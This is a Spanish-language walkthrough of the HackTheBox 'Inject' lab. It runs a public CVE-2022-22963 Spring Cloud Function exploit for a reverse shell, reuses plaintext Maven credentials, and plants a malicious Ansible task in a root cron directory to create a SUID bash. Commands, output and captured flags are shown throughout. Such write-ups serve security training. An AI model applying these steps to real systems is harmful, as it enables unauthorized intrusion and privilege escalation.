---
tags:
title: Inject - Easy (HTB)
permalink: /Inject-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.228.213
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 13:21 -0500
Initiating Ping Scan at 13:21
Scanning 10.129.228.213 [4 ports]
Completed Ping Scan at 13:21, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:21
Completed Parallel DNS resolution of 1 host. at 13:21, 0.50s elapsed
Initiating SYN Stealth Scan at 13:21
Scanning 10.129.228.213 [65535 ports]
Discovered open port 22/tcp on 10.129.228.213
Discovered open port 8080/tcp on 10.129.228.213
Completed SYN Stealth Scan at 13:21, 10.02s elapsed (65535 total ports)
Nmap scan report for 10.129.228.213
Host is up, received echo-reply ttl 63 (0.36s latency).
Scanned at 2026-02-12 13:21:26 EST for 10s
Not shown: 62656 closed tcp ports (reset), 2877 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds
           Raw packets sent: 93804 (4.127MB) | Rcvd: 79138 (3.166MB)
-e [*] IP: 10.129.228.213
[*] Puertos abiertos: 22,8080
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,8080 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 13:21 -0500
Nmap scan report for 10.129.228.213
Host is up (0.48s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.65 seconds
```

## Website

La pagina principal corre con Zodd Cloud.

![image-center](/assets/images/Pasted image 20260212152323.png)
## Shell as frank
### SpringBoot RCE

Buscando por dicho servicio, me salen varios exploits ya que esta pagina usa `SpringBoot`. La cual es vulnerable a ejecución remota de comandos a través de una librería vulnerable

Me clone [este script](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit) en mi maquina y lo ejecute indicando la `ip` de la maquina

```bash
python3 exploit.py --url http://inject.htb:8080
[+] Target http://inject.htb:8080

[+] Checking if http://inject.htb:8080 is vulnerable to CVE-2022-22963...

[+] http://inject.htb:8080 is vulnerable

[/] Attempt to take a reverse shell? [y/n]y
listening on [any] 4444 ...
[$$] Attacker IP:  10.10.17.19
```
### Shell

Luego de unos segundos recibo la conexión como el usuario `frank`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.213] 37006
bash: cannot set terminal process group (793): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ id
id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
```
## Shell as phil
### Settings file

Viendo en el directorio personal del usuario `frank`, vi un archivo de configuración con credenciales.

```bash
frank@inject:~/.m2$ ls -la
total 12
drwx------ 2 frank frank 4096 Feb  1  2023 .
drwxr-xr-x 5 frank frank 4096 Feb  1  2023 ..
-rw-r----- 1 root  frank  617 Jan 31  2023 settings.xml
frank@inject:~/.m2$ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

### Auth

Las mismas son validas para el usuario `phil`.

```bash
frank@inject:~$ su phil
Password:
phil@inject:~$ cat user.txt
46d5665ec8044a1bcad930da9b7db7bc
```
## Shell as root

### Cron task abuse

Viendo los grupos de este usuario, cuenta con la membresia del grupo `staff`, el cual tiene acceso a los siguientes archivos y carpetas.

```bash
phil@inject:/tmp$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:/tmp$ find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid
```
### pspy

Subi `pspy` a la maquina para monitorear procesos que se estén ejecutando a cada minuto, viendo así el siguiente.

```bash
2026/02/12 19:26:01 CMD: UID=0     PID=6181   | sleep 10
2026/02/12 19:26:01 CMD: UID=0     PID=6183   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2026/02/12 19:26:01 CMD: UID=0     PID=6184   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

El mismo indica que el usuario `root` ejecuta `/usr/local/bin/ansible-parallel` sobre todos los archivos `yml` en el directorio `/opt/automation/tasks`.
### Malicious yml file

Por lo que cree un archivo malicioso que copie la `bash` en `/tmp/root/bash` con el bit `SUID`.

```bash
phil@inject:/tmp$ cat > /opt/automation/tasks/pwn.yml << 'EOF'
> ---
> - hosts: localhost
>   connection: local
>   tasks:
>     - name: SUID bash
>       shell: cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
> EOF
```
### Shell

Luego de un minuto aprox, la tarea cron se vuelve a ejecutar, ejecutando así el archivo `yml` que yo cree. Y valide que mi shell maliciosa estuviera y si.

```bash
phil@inject:/tmp$ cat /opt/automation/tasks/pwn.yml
cat: /opt/automation/tasks/pwn.yml: No such file or directory
phil@inject:/tmp$ ls -la
total 4988
drwxrwxrwt 15 root  root    12288 Feb 12 19:28 .
<SNIP>
-rwsr-xr-x  1 root  root  1183448 Feb 12 19:28 rootbash
drwx------  3 root  root     4096 Feb 12 18:21 systemd-private-037926677a044d22adb23065d807f680-ModemManager.service-BCIOHi
drwx------  3 root  root     4096 Feb 12 18:21 systemd-private-037926677a044d22adb23065d807f680-systemd-logind.service-scaHCh
drwx------  3 root  root     4096 Feb 12 18:21 systemd-private-037926677a044d22adb23065d807f680-systemd-resolved.service-RHAPnj
drwx------  3 root  root     4096 Feb 12 18:20 systemd-private-037926677a044d22adb23065d807f680-systemd-timesyncd.service-oXlO5f
<SNIP>
```

Solo me quedo usar la misma para convertirme en `root`.

```bash
phil@inject:/tmp$ ./rootbash -p
rootbash-5.0# whomai
rootbash: whomai: command not found
rootbash-5.0# id
uid=1001(phil) gid=1001(phil) euid=0(root) groups=1001(phil),50(staff)
rootbash-5.0# whoami
root
```

```bash
rootbash-5.0# cat root.txt
2eb87a...
```

`~Happy Hacking.`

